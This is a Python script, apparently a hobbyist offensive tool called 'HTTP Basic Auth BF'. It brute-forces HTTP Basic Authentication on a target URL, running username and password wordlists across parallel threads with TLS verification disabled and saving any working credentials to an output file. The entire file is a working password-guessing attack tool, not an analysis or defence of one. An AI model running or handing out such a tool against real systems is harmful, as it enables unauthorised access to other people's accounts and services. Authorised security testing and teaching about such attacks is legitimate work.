import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.listUtils as lu
import argparse
import sys
import requests
import os
import threading
import time

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

__VERSION = "v300623"

parser = argparse.ArgumentParser(description="HTTP Basic Auth BF " + __VERSION)
REQUIRED_ARGUMENTS = parser.add_argument_group("Argomenti necessari")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Argomenti opzionali")

# Argomenti necessari
REQUIRED_ARGUMENTS.add_argument('-U',metavar='"URL"',type=str,required=True,help='URL / TARGET IP')
REQUIRED_ARGUMENTS.add_argument('-T',metavar='"TEXT"',type=str,required=True,help='Text to parse used to understand wether the attack was successful or not. Example: -T "Error: Unauthorized Access"')
REQUIRED_ARGUMENTS.add_argument('--pass-wordlist',metavar='"PASSWORD WORDLIST"',type=str,required=True,help='Password wordlist')
REQUIRED_ARGUMENTS.add_argument('--user-wordlist',metavar='"WORDLIST"',type=str,required=True,help='Username wordlist')
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"THREADS"',type=int,required=True,help='Threads (parallel requests)')
REQUIRED_ARGUMENTS.add_argument('-o',metavar='"OUTPUT FILE"',type=str,required=True,help='Output file ')



# Argomenti opzionali
#REQUIRED_ARGUMENTS.add_argument('--method',metavar='"REQUEST METHOD"',type=int,help='0: GET, 1: POST, 2: PUT')
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = not ("--debug" in sys.argv)
LOCK = threading.Lock()
THREAD_COUNT = args.t
OUTPUT_FILE_NAME = args.o

fm.DEFAULT_FILE_ENCODING = 'latin-1'

p_wList = fm.fileToSimpleList(args.pass_wordlist)
u_wList = fm.fileToSimpleList(args.user_wordlist)

PROGRESS_COUNT = 0
TOTAL_COUNT = len(p_wList)

# ========================================================================================================

def makeRequest(credentials: tuple, url: str, errorMsg: str):
    global PROGRESS_COUNT
    r = requests.get(url=args.U,verify=False,auth=credentials)

    LOCK.acquire()
    PROGRESS_COUNT += 1
    LOCK.release()

    if errorMsg in r.text:
        return False
    else:
        return True

def makeRequest_threadWrapper(user: str,pwSublist: list, url: str, errorMsg: str, threadID: int):
    LOCK.acquire()
    np.infoPrint("[Thread #{}] Thread started".format(str(threadID)))
    LOCK.release()


    for pw in pwSublist:
        credentials = (user,pw)
        result = makeRequest(credentials,url,errorMsg)

        if result is True:
            LOCK.acquire()
            np.infoPrint("[Thread #{}] Creds found: {} {}".format(str(threadID),user,pw))

            line = "{}:{}\n".format(user,pw)
            open(OUTPUT_FILE_NAME,'a').write(line)
            LOCK.release()


    LOCK.acquire()
    np.infoPrint("[Thread #{}] Thread's job done".format(str(threadID)))
    LOCK.release()

def informationalThread():
    progressPerc = 0
    performance = None
    sleepTime = 10
    previousProgressCount = 0

    while progressPerc <= 100:
        progressPerc = int((PROGRESS_COUNT / TOTAL_COUNT) * 100)

        LOCK.acquire()
        performance = int(abs(previousProgressCount - PROGRESS_COUNT) / sleepTime)
        previousProgressCount = PROGRESS_COUNT
        LOCK.release()


        msg = "\rProgress: {}% \r\t\t\t {}/{} \r\t\t\t\t\t--- Performance: about {} pass/sec".format(str(progressPerc),PROGRESS_COUNT,TOTAL_COUNT,performance)
        LOCK.acquire()
        print(msg,end='')
        LOCK.release()

        time.sleep(sleepTime)

# ========================================================================================================




np.infoPrint("Splitting ...")
sublists = lu.splitList(p_wList,THREAD_COUNT)



# thread construction (once per each user)
for user in u_wList:
    np.infoPrint(" --------------------> Testing for user {} ...".format(user))

    infoThread = threading.Thread(target=informationalThread)

    threadList = []
    for i in range(0,THREAD_COUNT):
        t = threading.Thread(target=makeRequest_threadWrapper,args=(user,sublists[i],args.U,args.T,i+1))
        threadList.append(t)


    # starting
    for t in threadList:
        t.start()

    infoThread.start()

    # waiting
    for t in threadList:
        t.join()


    PROGRESS_COUNT = 0